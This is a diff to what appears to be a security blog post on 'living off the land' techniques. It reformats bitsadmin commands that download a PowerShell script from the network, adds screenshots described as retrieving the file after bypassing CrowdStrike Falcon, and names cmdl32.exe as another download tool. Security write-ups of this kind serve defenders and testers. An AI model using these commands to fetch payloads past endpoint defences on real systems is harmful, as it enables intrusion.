@@ -32,10 +32,20 @@ You can find this tool in the following file paths:
 
 In this scenario, it was possible to successfully download the PowerShell script from GitHub, executing a command similar to:
 
-`bitsadmin /create 1 bitsadmin /addfile 1 file-URL save-location`  
-`bitsadmin /RESUME 1 bitsadmin /complete 1`
+```
+bitsadmin /create 1  
+bitsadmin /addfile 1 <file-URL> <save-location>  
+bitsadmin /RESUME 1  
+bitsadmin /complete 1
+```
+**Running the commands:**  
+![Setting up bitsadmin](/2022-08-04-living-off-the-land/bitsadmin-running.png){: width="1024" height="102"}  
 
-![Attempted download of external resource via Web Browser](/2022-08-04-living-off-the-land/bitsadmin.png){: width="500" height="102"}  
+**Downloading:**    
+![Downloading](/2022-08-04-living-off-the-land/bitsadmin.png){: width="500" height="102"}  
+
+**File Retrieved after bypassing CrowdStrike Falcon:**    
+![obtained](/2022-08-04-living-off-the-land/powershell-script-downloaded.png){: width="500" height="102"}  
 
 There are many other tools that can be used here. Another example is `cmdl32.exe` which by default is located here:
 
